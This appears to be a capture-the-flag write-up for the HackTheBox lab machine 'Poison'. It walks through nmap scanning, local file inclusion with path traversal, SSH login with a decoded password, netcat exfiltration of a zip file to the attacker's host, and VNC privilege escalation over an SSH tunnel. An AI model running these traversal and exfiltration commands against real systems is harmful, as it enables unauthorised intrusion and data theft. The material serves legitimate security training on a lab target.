# Recon
```
sudo nmap -sV -p- -sC -oN nmap.txt -O 10.10.10.84 -T5
```

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Poison/assets/1.png">

# Enumeration
We can view several scripts. One in particular looks promising as it shows a reference to pwdbackup.txt.
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Poison/assets/3.png">

The content gives us as multiple encoded string.
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Poison/assets/4.png">

After decoding it 13 times we get a password:
```
Charix!2#4%6&8(0
```

We try if we can use local file inclusion on the /etc/passwd file. We learn that root and charix will have a bash available.
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Poison/assets/2.png">

# Initial Foothold
Now we have a username and password we will try to connect with SSH:
```
ssh charix@10.10.10.84
```

We spot secret.zip and try to download it abusing the lfi vulnerability:
```
wget "http://10.10.10.84/browse.php?file=../../../../../../../home/charix/secret.zip"
```
That didn't work. Probably because the web user isn't charix and therefore we can't access his files. Netcat is available on the host. Let's use it to transfer the file.
```
nc -nlvp 4444 > secret.zip
```
```
cat secret.zip | nc 10.10.14.9 4444
```
We unzip the password protected zipfile with the previously found password. It contains a file named secret. Running it through ```strings``` and ```file``` didn't gave me much info on the file.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Poison/assets/5.png">

# Privilege Escalation
After some digging around we see that there are two services running on port 5801 and 5901. Google tells us that they are used by vnc.
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Poison/assets/6.png">

But we can't access them directly, otherwise they would have popped up during the nmap scan.
We can however tunnel the traffic with port forwarding.

```
ssh -L 5901:localhost:5901 -N -f -l charix 10.10.10.84 
```
Now we can setup a vnc connection with the target. This is where the secret file comes in handy as we can pass it as parameter.
```
vncviewer localhost:5901 -passwd secret
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Poison/assets/7.png">




